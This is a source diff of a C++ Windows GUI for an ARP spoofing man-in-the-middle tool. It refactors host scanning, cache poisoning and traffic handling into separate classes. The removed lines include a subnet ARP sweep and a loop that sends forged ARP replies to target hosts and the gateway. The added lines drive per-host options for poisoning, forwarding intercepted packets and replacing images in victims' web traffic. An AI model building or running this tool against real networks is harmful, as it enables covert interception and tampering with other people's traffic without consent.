@@ -1,7 +1,10 @@
 #include "stdafx.h"
 #include "ARPTestDlg.h"
-#include <thread>
+#include "ARPTest.h"
+#include "NetManager.h"
 #include "MITM.h"
+#include "PacketHandlers.h"
+#include "ThreadPool.h"
 #include "Helper.h"
 #include "Packet.h"
 
@@ -116,9 +119,10 @@ BOOL CARPTestDlg::OnInitDialog()
 
 	m_autoCheckCheck.SetCheck(TRUE);
 
+
 	// get device list
 	char errBuf[PCAP_ERRBUF_SIZE];
-	if (pcap_findalldevs(&g_deviceList, errBuf) == -1)
+	if (!g_netManager.Init(errBuf))
 	{
 		CString msg = "Error in pcap_findalldevs: ";
 		msg += errBuf;
@@ -126,8 +130,9 @@ BOOL CARPTestDlg::OnInitDialog()
 		DestroyWindow();
 		return TRUE;
 	}
+
 	// show device list
-	for (pcap_if_t* device = g_deviceList; device != nullptr; device = device->next)
+	for (pcap_if_t* device = g_netManager.m_deviceList; device != nullptr; device = device->next)
 		m_deviceDescList.AddString(device->description != nullptr ? device->description : "");
 	if (m_deviceDescList.GetCount() <= 0)
 	{
@@ -138,6 +143,9 @@ BOOL CARPTestDlg::OnInitDialog()
 	m_deviceDescList.SetCurSel(0);
 	OnLbnSelchangeList1();
 
+	// init packet handlers
+	g_packetHandlers.Init();
+
 	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
 }
 
@@ -146,60 +154,28 @@ void CARPTestDlg::OnDestroy()
 {
 	CDialog::OnDestroy();
 
-	g_attacking = FALSE;
-	g_programRunning = FALSE;
-	//Sleep(3000); // wait for threads to end
+	g_mitm.StopAttack();
+	theApp.m_isRunning = false;
 	g_threadPool.StopThreads();
-	pcap_freealldevs(g_deviceList);
+	g_netManager.Uninit();
 }
 
 /////////////////////////////////////////////////////////////////////////////////////////
 
-// get adapter infomation and fill global variables
+// get adapter infomation and fill edits
 void CARPTestDlg::OnLbnSelchangeList1()
 {
-	// get adapter
 	int index = m_deviceDescList.GetCurSel();
-	g_adapter = g_deviceList;
-	for (int i = 0; i < index; i++)
-		g_adapter = g_adapter->next;
-
-	// get adapter infomation
-	CString ip, gateway;
-	MacAddress mac;
-
-	IP_ADAPTER_INFO adapterInfo[16];
-	DWORD bufSize = sizeof(adapterInfo);
-	DWORD status = GetAdaptersInfo(adapterInfo, &bufSize);
-	if (status != ERROR_SUCCESS)
-	{
-		MessageBox("Failed to get adapter infomation.", NULL, MB_ICONERROR);
-		return;
-	}
-	CString name = g_adapter->name;
-	for (PIP_ADAPTER_INFO pInfo = adapterInfo; pInfo != nullptr; pInfo = pInfo->Next)
-	{
-		if (name.Find(pInfo->AdapterName) != -1)
-		{
-			ip = pInfo->IpAddressList.IpAddress.String;
-			mac = *(MacAddress*)pInfo->Address;
-			gateway = pInfo->GatewayList.IpAddress.String;
-			break;
-		}
-	}
-	if (ip == "")
+	if (!g_netManager.SelectAdapter(index))
 	{
 		MessageBox("Failed to get adapter infomation.", NULL, MB_ICONERROR);
 		return;
 	}
 
-	// fill global variables
-	m_selfIpEdit.SetWindowText(ip);
-	InputIp(ip, g_selfIp);
-	m_selfMacEdit.SetWindowText((CString)mac);
-	g_selfMac = mac;
-	m_selfGatewayEdit.SetWindowText(gateway);
-	InputIp(gateway, g_selfGateway);
+	// fill edits
+	m_selfIpEdit.SetWindowText((CString)g_netManager.m_selfIp);
+	m_selfMacEdit.SetWindowText((CString)g_netManager.m_selfMac);
+	m_selfGatewayEdit.SetWindowText((CString)g_netManager.m_selfGateway);
 }
 
 // confirm device and scan hosts
@@ -207,134 +183,74 @@ void CARPTestDlg::OnBnClickedButton2()
 {
 	m_deviceDescList.EnableWindow(FALSE);
 	m_confirmButton.EnableWindow(FALSE);
+	m_attackButton.EnableWindow(TRUE);
 	SetTimer(0, 3000, NULL);
 	
-	/*std::thread thread(ScanHostThread);
-	thread.detach();*/
-	class ScanHostTask : public Task
-	{
-	private:
-		CARPTestDlg* dlg;
-	public:
-		ScanHostTask(CARPTestDlg* _dlg) : dlg(_dlg) {};
-		void Run()
+	g_netManager.StartScanHost([this](IpAddress ip, MacAddress mac){
+		// add to list
+		int index = -1;
+		if (ip != g_netManager.m_selfIp && ip != g_netManager.m_selfGateway)
 		{
-			AdapterHandle adapter(GetAdapterHandle());
-			if (adapter == nullptr)
-				return;
+			auto& arpCheatConfig = g_mitm.m_arpCheat->GetConfig(ip);
+			auto& mitmConfig = g_mitm.GetConfig(ip);
+			auto& imageReplaceConfig = g_packetHandlers.imageReplace.GetConfig(ip);
 
-			ARPPacket packet(TRUE);
-			memset(&packet.destinationMac, 0xFF, sizeof(packet.destinationMac)); // broadcast
-			packet.SetSender(g_selfIp, g_selfMac);
-
-			// get IP range
-			DWORD rSelfIp = ntohl(g_selfIp);
-			DWORD startIp = rSelfIp & 0xFFFFFF00 | 0x01;
-			DWORD stopIp = rSelfIp & 0xFFFFFF00 | 0xFE;
-
-			// scan
-			packet.targetIp = g_selfGateway;
-			pcap_sendpacket(adapter.get(), (u_char*)&packet, sizeof(packet));
-			Sleep(10);
-			for (DWORD ip = startIp; ip <= stopIp; ip++)
-			{
-				DWORD rIp = htonl(ip);
-				if (rIp != g_selfIp && rIp != g_selfGateway)
-				{
-					packet.targetIp = rIp;
-					pcap_sendpacket(adapter.get(), (u_char*)&packet, sizeof(packet));
-					Sleep(10);
-				}
-			}
-
-			// get reply
-			SetFilter(adapter.get(), "ether proto arp");
-			pcap_pkthdr* header;
-			const BYTE* pkt_data;
-			int res;
-			while (g_programRunning && (res = pcap_next_ex(adapter.get(), &header, &pkt_data)) >= 0)
-			{
-				if (res == 0) // timeout
-					continue;
-				const ARPPacket* pak = (const ARPPacket*)pkt_data;
-				if (pak->type != PROTOCOL_ARP
-					|| (pak->opcode != ARP_OPCODE_REPLY && pak->opcode != ARP_OPCODE_REQUEST)
-					|| pak->senderIp == 0) // not ARP
-					continue;
-				g_hostAttackListLock.lock();
-				if (g_host.find(pak->senderIp) != g_host.end()) // in g_host
-				{
-					g_hostAttackListLock.unlock();
-					continue;
-				}
-				g_hostAttackListLock.unlock();
-
-				// add to list
-				int index = -1;
-				if (pak->senderIp != g_selfIp && pak->senderIp != g_selfGateway)
-				{
-					index = dlg->m_hostList.GetItemCount();
-					dlg->m_hostList.InsertItem(index, "");
-					BYTE* bIp = (BYTE*)&pak->senderIp;
-					CString tmp;
-					tmp.Format("%u.%u.%u.%u", bIp[0], bIp[1], bIp[2], bIp[3]);
-					dlg->m_hostList.SetItemText(index, 1, tmp);
-					dlg->m_hostList.SetItemText(index, 2, (CString)pak->senderMac);
-					dlg->m_hostList.SetItemText(index, 3, "↑↓");
-					dlg->m_hostList.SetItemText(index, 4, "True");
-					dlg->m_hostList.SetItemData(index, (DWORD_PTR)pak->senderIp);
-				}
-				// add to g_host
-				g_hostAttackListLock.lock();
-				HostInfoSetting& host = g_host[pak->senderIp];
-				g_hostAttackListLock.unlock();
-				host.ip = pak->senderIp;
-				host.mac = pak->senderMac;
-
-				if (pak->senderIp == g_selfGateway)
-					g_gatewayMac = pak->senderMac;
-
-				// auto check
-				if (index != -1 && dlg->m_autoCheckCheck.GetCheck())
-					dlg->m_hostList.SetCheck(index);
-			}
-			TRACE("scan end\n");
+			index = m_hostList.GetItemCount();
+			m_hostList.InsertItem(index, "");
+			m_hostList.SetItemText(index, 1, (CString)ip);
+			m_hostList.SetItemText(index, 2, (CString)mac);
+			CString tmp;
+			if (arpCheatConfig.cheatTarget)
+				tmp += "↑";
+			if (arpCheatConfig.cheatGateway)
+				tmp += "↓";
+			m_hostList.SetItemText(index, 3, tmp);
+			m_hostList.SetItemText(index, 4, mitmConfig.forward ? "True" : "False");
+			m_hostList.SetItemData(index, (DWORD_PTR)ip);
 		}
-	};
-	g_threadPool.AddTask(std::unique_ptr<ScanHostTask>(new ScanHostTask(this)));
+
+		// auto check
+		if (index != -1 && m_autoCheckCheck.GetCheck())
+			m_hostList.SetCheck(index);
+	});
 }
 
-#pragma region UI
+#pragma region Host Config
 /////////////////////////////////////////////////////////////////////////////////////////
 //
-//                                         UI
+//                                      Host Config
 //
 
-// add / delete attack list / display host information
+// attack / display host information
 void CARPTestDlg::OnLvnItemchangedList2(NMHDR *pNMHDR, LRESULT *pResult)
 {
 	LPNMLISTVIEW pNMLV = reinterpret_cast<LPNMLISTVIEW>(pNMHDR);
 	*pResult = 0;
 
+	ARPCheat& arpCheat = *g_mitm.m_arpCheat;
+	IpAddress ip = (DWORD)m_hostList.GetItemData(pNMLV->iItem);
+	if (ip == 0)
+		return;
+	auto& arpConfig = arpCheat.GetConfig(ip);
+	auto& mitmConfig = g_mitm.GetConfig(ip);
+	auto& imageReplaceConfig = g_packetHandlers.imageReplace.GetConfig(ip);
+
+	// select a new host
 	if (pNMLV->uChanged == LVIF_STATE)
 	{
 		if ((pNMLV->uNewState & LVIS_SELECTED) != 0)
 		{
-			DWORD ip = (DWORD)m_hostList.GetItemData(pNMLV->iItem);
-			g_hostAttackListLock.lock();
-			HostInfoSetting& host = g_host[ip];
-			g_hostAttackListLock.unlock();
-
-			m_cheatTargetCheck.SetCheck(host.cheatTarget);
-			m_cheatGatewayCheck.SetCheck(host.cheatGateway);
-			m_forwardCheck.SetCheck(host.forward);
-			m_replaceImagesCheck.SetCheck(host.replaceImages);
-			m_imagePathEdit.SetWindowText(host.imagePath);
+			m_cheatTargetCheck.SetCheck(arpConfig.cheatTarget);
+			m_cheatGatewayCheck.SetCheck(arpConfig.cheatGateway);
+			m_forwardCheck.SetCheck(mitmConfig.forward);
+			m_replaceImagesCheck.SetCheck(imageReplaceConfig.replaceImages);
+			m_imagePathEdit.SetWindowText(imageReplaceConfig.imagePath);
 			OnTimer(0);
 			return;
 		}
 	}
 
+#pragma region
 	if (pNMLV->uOldState == 0 && pNMLV->uNewState == 0) // No change
 		return;
 
@@ -351,48 +267,37 @@ void CARPTestDlg::OnLvnItemchangedList2(NMHDR *pNMHDR, LRESULT *pResult)
 	if (prevState == checked) // No change in check box
 		return;
 	// Now checked holds the new check box state
+#pragma endregion
 
-	DWORD ip = (DWORD)m_hostList.GetItemData(pNMLV->iItem);
-	g_hostAttackListLock.lock();
-	if (checked != 0)
-	{
-		HostInfoSetting& host = g_host[ip];
-		g_attackList[ip] = &host;
-		g_attackListMac[host.mac] = &host;
-	}
-	else
-	{
-		g_attackList.erase(ip);
-		g_attackListMac.erase(g_host[ip].mac);
-	}
-	g_hostAttackListLock.unlock();
+	// attack or not
+	arpCheat.SetConfig(ip, checked != 0, arpConfig.cheatTarget, arpConfig.cheatGateway);
 }
 
-HostInfoSetting* CARPTestDlg::GetCurSelHost(int& index)
+IpAddress CARPTestDlg::GetCurSelIp(int& index)
 {
 	POSITION pos = m_hostList.GetFirstSelectedItemPosition();
 	if (pos == nullptr)
-		return nullptr;
+		return 0;
 	index = m_hostList.GetNextSelectedItem(pos);
-	DWORD ip = (DWORD)m_hostList.GetItemData(index);
-	g_hostAttackListLock.lock();
-	HostInfoSetting* res = &g_host[ip];
-	g_hostAttackListLock.unlock();
-	return res;
+	return (DWORD)m_hostList.GetItemData(index);
 }
 
 // cheat target
 void CARPTestDlg::OnBnClickedCheck3()
 {
 	int index;
-	HostInfoSetting* host = GetCurSelHost(index);
-	if (host == nullptr)
+	IpAddress ip = GetCurSelIp(index);
+	if (ip == 0)
 		return;
-	host->cheatTarget = m_cheatTargetCheck.GetCheck();
+
+	ARPCheat& arpCheat = *g_mitm.m_arpCheat;
+	auto& config = arpCheat.GetConfig(ip);
+	arpCheat.SetConfig(ip, config.attack, m_cheatTargetCheck.GetCheck() != 0, config.cheatGateway);
+
 	CString tmp;
-	if (host->cheatTarget)
+	if (config.cheatTarget)
 		tmp += "↑";
-	if (host->cheatGateway)
+	if (config.cheatGateway)
 		tmp += "↓";
 	m_hostList.SetItemText(index, 3, tmp);
 }
@@ -401,14 +306,18 @@ void CARPTestDlg::OnBnClickedCheck3()
 void CARPTestDlg::OnBnClickedCheck4()
 {
 	int index;
-	HostInfoSetting* host = GetCurSelHost(index);
-	if (host == nullptr)
+	IpAddress ip = GetCurSelIp(index);
+	if (ip == 0)
 		return;
-	host->cheatGateway = m_cheatGatewayCheck.GetCheck();
+
+	ARPCheat& arpCheat = *g_mitm.m_arpCheat;
+	auto& config = arpCheat.GetConfig(ip);
+	arpCheat.SetConfig(ip, config.attack, config.cheatTarget, m_cheatGatewayCheck.GetCheck() != 0);
+
 	CString tmp;
-	if (host->cheatTarget)
+	if (config.cheatTarget)
 		tmp += "↑";
-	if (host->cheatGateway)
+	if (config.cheatGateway)
 		tmp += "↓";
 	m_hostList.SetItemText(index, 3, tmp);
 }
@@ -417,50 +326,44 @@ void CARPTestDlg::OnBnClickedCheck4()
 void CARPTestDlg::OnBnClickedCheck1()
 {
 	int index;
-	HostInfoSetting* host = GetCurSelHost(index);
-	if (host == nullptr)
+	IpAddress ip = GetCurSelIp(index);
+	if (ip == 0)
 		return;
-	host->forward = m_forwardCheck.GetCheck();
-	m_hostList.SetItemText(index, 4, host->forward ? "True" : "False");
+
+	auto& config = g_mitm.GetConfig(ip);
+	g_mitm.SetConfig(ip, m_forwardCheck.GetCheck() != 0);
+
+	m_hostList.SetItemText(index, 4, config.forward ? "True" : "False");
 }
 
 // replace images
 void CARPTestDlg::OnBnClickedCheck2()
 {
 	int index;
-	HostInfoSetting* host = GetCurSelHost(index);
-	if (host == nullptr)
+	IpAddress ip = GetCurSelIp(index);
+	if (ip == 0)
 		return;
-	host->replaceImages = m_replaceImagesCheck.GetCheck();
-	m_hostList.SetItemText(index, 5, host->replaceImages ? host->imagePath : "");
+
+	auto& config = g_packetHandlers.imageReplace.GetConfig(ip);
+	g_packetHandlers.imageReplace.SetConfig(ip, m_replaceImagesCheck.GetCheck() != 0, config.imagePath);
+	
+	m_hostList.SetItemText(index, 5, config.replaceImages ? config.imagePath : "");
 }
 
 // image path
 void CARPTestDlg::OnEnKillfocusEdit1()
 {
 	int index;
-	HostInfoSetting* host = GetCurSelHost(index);
-	if (host == nullptr)
+	IpAddress ip = GetCurSelIp(index);
+	if (ip == 0)
 		return;
-	m_imagePathEdit.GetWindowText(host->imagePath);
-	m_hostList.SetItemText(index, 5, host->replaceImages ? host->imagePath : "");
 
-	// read image
-	CFile f;
-	host->imageDataLock.lock();
-	if (f.Open(host->imagePath, CFile::modeRead | CFile::typeBinary))
-	{
-		host->imageDataLen = (DWORD)f.GetLength();
-		host->imageData.reset(new BYTE[host->imageDataLen]);
-		f.Read(host->imageData.get(), host->imageDataLen);
-	}
-	else
-	{
-		host->imageDataLen = 0;
-		host->imageData.reset();
-		MessageBox("Failed to load the image.");
-	}
-	host->imageDataLock.unlock();
+	CString path;
+	m_imagePathEdit.GetWindowText(path);
+	auto& config = g_packetHandlers.imageReplace.GetConfig(ip);
+	g_packetHandlers.imageReplace.SetConfig(ip, config.replaceImages, path);
+
+	m_hostList.SetItemText(index, 5, config.replaceImages ? config.imagePath : "");
 }
 
 // update status
@@ -469,11 +372,15 @@ void CARPTestDlg::OnTimer(UINT_PTR nIDEvent)
 	if (nIDEvent == 0) // update status
 	{
 		int index;
-		HostInfoSetting* host = GetCurSelHost(index);
-		if (host == nullptr)
+		IpAddress ip = GetCurSelIp(index);
+		if (ip == 0)
 			return;
+
+		auto& mitmConfig = g_mitm.GetConfig(ip);
+		auto& imageReplaceConfig = g_packetHandlers.imageReplace.GetConfig(ip);
+
 		CString status;
-		status.Format("Sent %u, Received %u, Replaced %u", host->send, host->receive, host->replace);
+		status.Format("Sent %u, Received %u, Replaced %u", mitmConfig.send, mitmConfig.receive, imageReplaceConfig.replace);
 		m_statusStatic.SetWindowText(status);
 	}
 
@@ -502,88 +409,22 @@ void CARPTestDlg::OnBnClickedButton3()
 // start / stop and send ARP packet
 void CARPTestDlg::OnBnClickedButton1()
 {
-	if (g_attacking)
+	if (g_mitm.IsAttacking())
 	{
-		g_attacking = FALSE;
+		g_mitm.StopAttack();
 		m_attackButton.EnableWindow(FALSE);
 		return;
 	}
-	g_attacking = TRUE;
 	m_attackButton.EnableWindow(FALSE);
 
-	/*std::thread thread(AttackThread);
-	thread.detach();*/
-	class AttackTask : public Task
-	{
-	private:
-		CARPTestDlg* dlg;
-	public:
-		AttackTask(CARPTestDlg* _dlg) : dlg(_dlg) {};
-		void Run()
+	g_mitm.StartAttack([this]{
+		m_attackButton.SetWindowText("Stop");
+		m_attackButton.EnableWindow(TRUE);
+	}, [this]{
+		if (theApp.m_isRunning)
 		{
-			AdapterHandle adapter(GetAdapterHandle());
-			if (adapter == nullptr)
-				return;
-
-			dlg->m_attackButton.SetWindowText("Stop");
-			dlg->m_attackButton.EnableWindow(TRUE);
-			// start capture
-			std::thread packetHandleThread(PacketHandleThread);
-
-			ARPPacket packet(FALSE);
-			packet.SetSender(0, g_selfMac);
-			// send
-			while (g_attacking)
-			{
-				DWORD time = GetTickCount();
-				g_hostAttackListLock.lock();
-				for (const auto& i : g_attackList)
-				{
-					if (i.second->cheatTarget) // send to target
-					{
-						packet.SetTarget(i.first, i.second->mac);
-						packet.senderIp = g_selfGateway;
-						pcap_sendpacket(adapter.get(), (u_char*)&packet, sizeof(packet));
-					}
-					if (i.second->cheatGateway) // send to gateway
-					{
-						packet.SetTarget(g_selfGateway, g_gatewayMac);
-						packet.senderIp = i.first;
-						pcap_sendpacket(adapter.get(), (u_char*)&packet, sizeof(packet));
-					}
-				}
-				g_hostAttackListLock.unlock();
-				Sleep(1000 - (GetTickCount() - time));
-			}
-
-			//////////////////////////////////////////////////////////////////////////////
-			// stop attacking
-
-			packetHandleThread.join();
-
-			// recover
-			g_hostAttackListLock.lock();
-			for (const auto& i : g_attackList)
-			{
-				// send to target
-				packet.SetSender(g_selfGateway, g_gatewayMac);
-				packet.SetTarget(i.first, i.second->mac);
-				pcap_sendpacket(adapter.get(), (u_char*)&packet, sizeof(packet));
-				// send to gateway
-				packet.SetSender(i.first, i.second->mac);
-				packet.SetTarget(g_selfGateway, g_gatewayMac);
-				pcap_sendpacket(adapter.get(), (u_char*)&packet, sizeof(packet));
-			}
-			g_hostAttackListLock.unlock();
-
-			// end
-			if (g_programRunning)
-			{
-				dlg->m_attackButton.SetWindowText("Start");
-				dlg->m_attackButton.EnableWindow(TRUE);
-			}
-			TRACE("attack end\n");
+			m_attackButton.SetWindowText("Start");
+			m_attackButton.EnableWindow(TRUE);
 		}
-	};
-	g_threadPool.AddTask(std::unique_ptr<AttackTask>(new AttackTask(this)));
+	});
 }
